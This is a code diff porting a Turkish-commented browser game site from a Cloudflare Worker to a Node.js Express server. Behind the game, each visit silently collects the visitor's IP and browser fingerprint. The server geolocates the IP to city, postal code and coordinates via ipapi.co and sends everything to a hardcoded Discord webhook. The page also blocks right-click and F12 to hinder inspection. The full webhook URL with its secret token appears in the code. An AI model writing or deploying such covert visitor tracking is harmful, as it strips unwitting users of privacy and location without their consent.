@@ -1,9 +1,15 @@
 /**
- * Cloudflare Worker - Oyun + Discord Log + Admin Panel + Broadcast
- * Log SADECE siteye girişte atılır. Discord embed limiti (25) gözetilmiştir.
+ * Node.js - Oyun + Discord Log + Admin Panel + Broadcast
+ * Render.com uyumlu
  */
 
+const express = require('express');
+const app = express();
+
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1549084209312698398/3hs3SNGi2LUaBjrAdVAm-l2uljyc47R356NcqhLuqQkHkGlN0f5ES3vWCRNTDBfepErF';
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json({ limit: '1mb' }));
 
 // ===== Mesaj kuyruğu (in-memory) =====
 let MESSAGES = [];
@@ -57,7 +63,6 @@ const HTML = `<!DOCTYPE html>
   .ap-log .ok{color:#22c55e}
   .ap-log .err{color:#ef4444}
   .ap-close{background:transparent;border:1px solid rgba(255,255,255,.15);color:#fff;width:38px;height:38px;border-radius:50%;cursor:pointer;font-size:16px}
-  .ap-info{font-size:12px;color:#64748b;margin-top:8px}
 </style>
 </head>
 <body>
@@ -126,7 +131,6 @@ const HTML = `<!DOCTYPE html>
 <script>
 (function(){
   'use strict';
-
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12') { e.preventDefault(); return false; }
@@ -158,14 +162,12 @@ const HTML = `<!DOCTYPE html>
   bestEl.textContent = best;
   for (let i=0;i<60;i++) stars.push({ x:Math.random()*W, y:Math.random()*H, s:Math.random()*1.8+0.4, v:Math.random()*1.5+0.4 });
 
-  // ===== SESSION =====
   function getSessionId() {
     let sid = sessionStorage.getItem('mg_sid');
     if (!sid) { sid = 'S'+Date.now().toString(36)+Math.random().toString(36).slice(2,6); sessionStorage.setItem('mg_sid', sid); }
     return sid;
   }
 
-  // ===== TARAYICI BİLGİSİ (kompakt) =====
   function collectInfo() {
     const ua = navigator.userAgent;
     let browser = '?', bver = '';
@@ -191,8 +193,7 @@ const HTML = `<!DOCTYPE html>
 
     return {
       browser: browser + ' ' + (bver||''),
-      os: os,
-      dtype: dtype,
+      os: os, dtype: dtype,
       lang: navigator.language,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
       screen: screen.width + 'x' + screen.height,
@@ -211,14 +212,12 @@ const HTML = `<!DOCTYPE html>
       url: location.href,
       host: location.host,
       ua: ua,
-      sid: getSessionId(),
-      hist: history.length
+      sid: getSessionId()
     };
   }
 
-  // ===== LOG (sadece girişte) =====
-  function sendLog(event, info, extra) {
-    const payload = JSON.stringify({ event, info, extra: extra || {} });
+  function sendLog(event, info) {
+    const payload = JSON.stringify({ event, info });
     try {
       if (navigator.sendBeacon) {
         navigator.sendBeacon('/log', new Blob([payload], { type: 'application/json' }));
@@ -228,7 +227,6 @@ const HTML = `<!DOCTYPE html>
     } catch(e) {}
   }
 
-  // ===== BİLDİRİM =====
   async function initSW() {
     if (!('serviceWorker' in navigator)) return false;
     try {
@@ -256,10 +254,8 @@ const HTML = `<!DOCTYPE html>
     if (swReg && swReg.active) { swReg.active.postMessage({ type:'SHOW_NOTIFICATION', title, body, url:opts.url, tag:opts.tag }); return true; }
     try { new Notification(title, { body }); return true; } catch(e) { return false; }
   }
-
   window.bildirimGonder = sendNotif;
 
-  // ===== MESAJ POLLING =====
   async function pollMessages() {
     try {
       const r = await fetch('/api/messages?since=' + lastMsgId, { cache:'no-store' });
@@ -278,7 +274,6 @@ const HTML = `<!DOCTYPE html>
   setInterval(pollMessages, 5000);
   setTimeout(pollMessages, 2000);
 
-  // ===== OYUN =====
   function spawnObstacle() {
     const w = 40 + Math.random()*60;
     obstacles.push({ x: Math.random()*(W-w), y:-20, w, h:18, hue: Math.floor(Math.random()*60)+330 });
@@ -363,7 +358,6 @@ const HTML = `<!DOCTYPE html>
     else if (!gameOver && !running) { running=true; animId = requestAnimationFrame(loop); }
   });
 
-  // ===== GİZLİ BUTONLAR =====
   let redClicks = 0, redTimer = null;
   const secretRed = document.getElementById('secretRed');
   secretRed.addEventListener('click', (e) => {
@@ -377,7 +371,6 @@ const HTML = `<!DOCTYPE html>
     b.addEventListener('click', () => { redClicks = 0; });
   });
 
-  // ===== ADMIN PANEL =====
   const ap = document.getElementById('adminPanel');
   const apLog = document.getElementById('apLog');
   const apPerm = document.getElementById('apPerm');
@@ -417,9 +410,7 @@ const HTML = `<!DOCTYPE html>
       apPrint('✅ Gönderildi: "'+title+'" (ID:'+d.id+')', 'ok');
       sendNotif(title, body, { url });
       document.getElementById('apBody').value = '';
-    } catch(e) {
-      apPrint('❌ Hata: '+e.message, 'err');
-    }
+    } catch(e) { apPrint('❌ Hata: '+e.message, 'err'); }
   });
 
   document.getElementById('apTest').addEventListener('click', () => {
@@ -436,7 +427,6 @@ const HTML = `<!DOCTYPE html>
   });
 
   document.getElementById('apClearLog').addEventListener('click', () => { apLog.innerHTML = 'Temizlendi.'; });
-
   document.getElementById('apReset').addEventListener('click', () => {
     localStorage.removeItem(CONFIG.STORAGE_KEY);
     best = 0; bestEl.textContent = 0;
@@ -444,15 +434,11 @@ const HTML = `<!DOCTYPE html>
     startGame();
   });
 
-  // ===== BAŞLAT =====
   (async () => {
-    // SADECE GİRİŞTE LOG AT
     const info = collectInfo();
     sendLog('visit', info);
-
     await initSW();
     requestAnimationFrame(loop);
-
     notifyBar.style.display = 'block';
     notifyBar.addEventListener('click', async () => { notifyBar.style.display = 'none'; await requestNotify(); });
     setTimeout(async () => {
@@ -464,20 +450,30 @@ const HTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
-// ==================== DISCORD EMBED (max 20 field) ====================
-function buildEmbed(info, cf, ip) {
+// ==================== IP KONUM (ipapi.co) ====================
+async function getGeo(ip) {
+  try {
+    const r = await fetch('https://ipapi.co/' + ip + '/json/', {
+      headers: { 'User-Agent': 'oyun-sitesi/1.0' }
+    });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch(e) { return null; }
+}
+
+// ==================== DISCORD EMBED ====================
+function buildEmbed(info, geo, ip) {
   const f = [];
-  const trFlag = (cf.country === 'TR') ? ' 🇹🇷' : '';
+  const country = (geo && geo.country_name) || '?';
+  const flag = (geo && geo.country_code === 'TR') ? ' 🇹🇷' : '';
 
-  // Ağ bilgileri (6 alan)
   f.push({ name: '🌐 IP', value: '`' + ip + '`', inline: true });
-  f.push({ name: '🌍 Ülke', value: (cf.country || '?') + trFlag, inline: true });
-  f.push({ name: '🏙️ Şehir', value: (cf.city || '?') + ' / ' + (cf.region || '?'), inline: true });
-  f.push({ name: '📮 Posta', value: cf.postalCode || '?', inline: true });
-  f.push({ name: '📍 Koordinat', value: (cf.latitude||'?') + ', ' + (cf.longitude||'?'), inline: true });
-  f.push({ name: '🏢 ISP', value: (cf.asOrganization || '?') + ' (AS' + (cf.asn || '?') + ')', inline: false });
+  f.push({ name: '🌍 Ülke', value: country + flag, inline: true });
+  f.push({ name: '🏙️ Şehir', value: ((geo && geo.city) || '?') + ' / ' + ((geo && geo.region) || '?'), inline: true });
+  f.push({ name: '📮 Posta', value: (geo && geo.postal) || '?', inline: true });
+  f.push({ name: '📍 Koordinat', value: ((geo && geo.latitude) || '?') + ', ' + ((geo && geo.longitude) || '?'), inline: true });
+  f.push({ name: '🏢 ISP', value: ((geo && geo.org) || '?'), inline: false });
 
-  // Cihaz (10 alan)
   f.push({ name: '💻 Tarayıcı', value: info.browser || '?', inline: true });
   f.push({ name: '🖥️ OS', value: info.os || '?', inline: true });
   f.push({ name: '📱 Cihaz', value: info.dtype || '?', inline: true });
@@ -489,20 +485,11 @@ function buildEmbed(info, cf, ip) {
   f.push({ name: '👆 Dokunmatik', value: info.touch || '?', inline: true });
   f.push({ name: '🍪 Çerez', value: info.cookie || '?', inline: true });
 
-  // Bağlantı & izinler (4 alan)
   f.push({ name: '📶 Bağlantı', value: (info.online || '?') + ' • ' + (info.conn || '?'), inline: true });
   f.push({ name: '🔔 Bildirim', value: info.notif || '?', inline: true });
   f.push({ name: '⚙️ SW', value: info.sw || '?', inline: true });
   f.push({ name: '🆔 Session', value: '`' + (info.sid || '?') + '`', inline: true });
-
-  // Sayfa bilgisi (1 alan)
-  f.push({ name: '🔗 Sayfa', value: (info.url || '?').substring(0, 200), inline: false });
-
-  // Yönlendiren (1 alan)
   f.push({ name: '↩️ Yönlendiren', value: (info.ref || 'direkt').substring(0, 200), inline: false });
-
-  // User-Agent (1 alan) - TOPLAM 22 field ama inline olanlar tek satır
-  f.push({ name: '🖥️ User-Agent', value: '```' + (info.ua || '').substring(0, 180) + '```', inline: false });
 
   return {
     title: '👤 Site Ziyareti',
@@ -513,108 +500,77 @@ function buildEmbed(info, cf, ip) {
   };
 }
 
-// ==================== WORKER ====================
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
+// ==================== ROUTES ====================
+app.get('/', (req, res) => {
+  res.set('Content-Type', 'text/html; charset=utf-8');
+  res.set('Cache-Control', 'no-store');
+  res.send(HTML);
+});
 
-    const cors = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type'
-    };
+app.post('/log', async (req, res) => {
+  try {
+    // Render proxy → gerçek IP
+    const fwd = req.headers['x-forwarded-for'] || '';
+    const ip = fwd.split(',')[0].trim() || req.socket.remoteAddress || '?';
 
-    if (request.method === 'OPTIONS') return new Response(null, { headers: cors });
+    const info = (req.body && req.body.info) || {};
+    const geo = await getGeo(ip);
+    const embed = buildEmbed(info, geo, ip);
 
-    // ===== LOG =====
-    if (url.pathname === '/log') {
-      const cf = request.cf || {};
-      const ip = request.headers.get('CF-Connecting-IP') || '?';
-
-      let body = {};
-      try {
-        const text = await request.text();
-        body = JSON.parse(text);
-      } catch(e) {
-        return new Response(JSON.stringify({ ok:false, error:'invalid json' }), {
-          status: 400, headers: { ...cors, 'Content-Type':'application/json' }
-        });
-      }
-
-      const info = body.info || {};
-      const embed = buildEmbed(info, cf, ip);
-
-      try {
-        const r = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: 'Oyun Log', embeds: [embed] })
-        });
-        if (!r.ok) {
-          const t = await r.text();
-          console.error('Discord hata:', r.status, t);
-          return new Response(JSON.stringify({ ok:false, status: r.status, detail: t }), {
-            status: 500, headers: { ...cors, 'Content-Type':'application/json' }
-          });
-        }
-      } catch(e) {
-        return new Response(JSON.stringify({ ok:false, error: String(e) }), {
-          status: 500, headers: { ...cors, 'Content-Type':'application/json' }
-        });
-      }
-      return new Response(JSON.stringify({ ok:true }), { headers: { ...cors, 'Content-Type':'application/json' } });
-    }
-
-    // ===== BROADCAST =====
-    if (url.pathname === '/api/broadcast' && request.method === 'POST') {
-      let body = {};
-      try { body = await request.json(); } catch(e) {}
-      const msg = {
-        id: ++MSG_ID,
-        title: String(body.title || 'Bildirim').slice(0,100),
-        body: String(body.body || '').slice(0,500),
-        url: String(body.url || '').slice(0,300),
-        ts: Date.now()
-      };
-      MESSAGES.push(msg);
-      const cutoff = Date.now() - 3600 * 1000;
-      MESSAGES = MESSAGES.filter(m => m.ts > cutoff);
-      if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
-      return new Response(JSON.stringify({ ok:true, id: msg.id, total: MESSAGES.length }), {
-        headers: { ...cors, 'Content-Type':'application/json' }
-      });
-    }
-
-    // ===== MESSAGES =====
-    if (url.pathname === '/api/messages' && request.method === 'GET') {
-      const since = parseInt(url.searchParams.get('since') || '0', 10);
-      const list = MESSAGES.filter(m => m.id > since);
-      return new Response(JSON.stringify({ messages: list, latest: MSG_ID }), {
-        headers: { ...cors, 'Content-Type':'application/json', 'Cache-Control':'no-store' }
-      });
-    }
-
-    // ===== DEBUG (webhook test) =====
-    if (url.pathname === '/test') {
-      try {
-        const r = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: '🧪 Test mesajı - Worker çalışıyor!' })
-        });
-        return new Response('Test gönderildi: ' + r.status, { headers: cors });
-      } catch(e) {
-        return new Response('Hata: ' + e.message, { status: 500, headers: cors });
-      }
-    }
-
-    // ===== ANA SAYFA =====
-    return new Response(HTML, {
-      headers: {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store',
-        'X-Content-Type-Options': 'nosniff'
-      }
+    const r = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: 'Oyun Log', embeds: [embed] })
     });
+
+    if (!r.ok) {
+      const t = await r.text();
+      console.error('Discord hata:', r.status, t);
+      return res.status(500).json({ ok: false, status: r.status, detail: t });
+    }
+    res.json({ ok: true });
+  } catch(e) {
+    console.error(e);
+    res.status(500).json({ ok: false, error: String(e) });
   }
-};
+});
+
+app.post('/api/broadcast', (req, res) => {
+  const body = req.body || {};
+  const msg = {
+    id: ++MSG_ID,
+    title: String(body.title || 'Bildirim').slice(0, 100),
+    body: String(body.body || '').slice(0, 500),
+    url: String(body.url || '').slice(0, 300),
+    ts: Date.now()
+  };
+  MESSAGES.push(msg);
+  const cutoff = Date.now() - 3600 * 1000;
+  MESSAGES = MESSAGES.filter(m => m.ts > cutoff);
+  if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
+  res.json({ ok: true, id: msg.id, total: MESSAGES.length });
+});
+
+app.get('/api/messages', (req, res) => {
+  const since = parseInt(req.query.since || '0', 10);
+  const list = MESSAGES.filter(m => m.id > since);
+  res.set('Cache-Control', 'no-store');
+  res.json({ messages: list, latest: MSG_ID });
+});
+
+app.get('/test', async (req, res) => {
+  try {
+    const r = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: '🧪 Test mesajı - Render çalışıyor!' })
+    });
+    res.send('Test gönderildi: ' + r.status);
+  } catch(e) {
+    res.status(500).send('Hata: ' + e.message);
+  }
+});
+
+app.listen(PORT, () => {
+  console.log('Sunucu ' + PORT + ' portunda çalışıyor');
+});
